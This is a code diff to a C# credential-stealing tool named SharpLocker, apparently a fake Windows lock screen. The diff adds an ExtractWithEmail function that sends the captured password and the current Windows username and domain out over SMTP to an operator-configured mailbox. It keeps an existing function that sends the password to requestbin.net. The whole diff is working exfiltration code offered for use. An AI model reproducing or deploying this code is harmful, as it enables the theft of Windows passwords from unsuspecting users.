@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
 using System.Net;
+using System.Net.Mail;
 using System.Text;
 using System.Threading.Tasks;
 using System.Web;
@@ -16,7 +17,10 @@ namespace SharpLocker
             //Extract with request bin
             //ExtractWithRequastBin(password);
 
+            //Extract with email
+            //ExtractWithEmail(password);
         }
+
         static void ExtractWithRequastBin(string password)
         {
             //http://requestbin.net
@@ -31,7 +35,7 @@ namespace SharpLocker
             bool EncodeWithBase64 = false;
             bool IncludeUsername = false;
 
-            //DONT TOUCH THIS
+            //Don't touch this!
             string p = "";
 
             if (IncludeUsername)
@@ -54,5 +58,27 @@ namespace SharpLocker
             req.GetResponse();
 
         }
+
+        static void ExtractWithEmail(string password)
+        {
+            //This sends an email with the password and computer details.
+
+            string e_pass = ""; //Password for the email
+            string e_address = ""; //Address of the email
+            string e_host_addr = ""; //Address of the email provider
+            int e_host_port = 587; //Port for the email providers
+
+            //Don't touch this!
+            string body = "Password: " + password + " Username&Domain: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+
+            MailMessage msg = new MailMessage(e_address, e_address, "Windwos Password on ", body);
+            msg.IsBodyHtml = true;
+            SmtpClient sc = new SmtpClient(e_host_addr, e_host_port);
+            sc.UseDefaultCredentials = false;
+            NetworkCredential cre = new NetworkCredential(e_address, e_pass);//your mail password
+            sc.Credentials = cre;
+            sc.EnableSsl = true;
+            sc.Send(msg);
+        } 
     }
 }
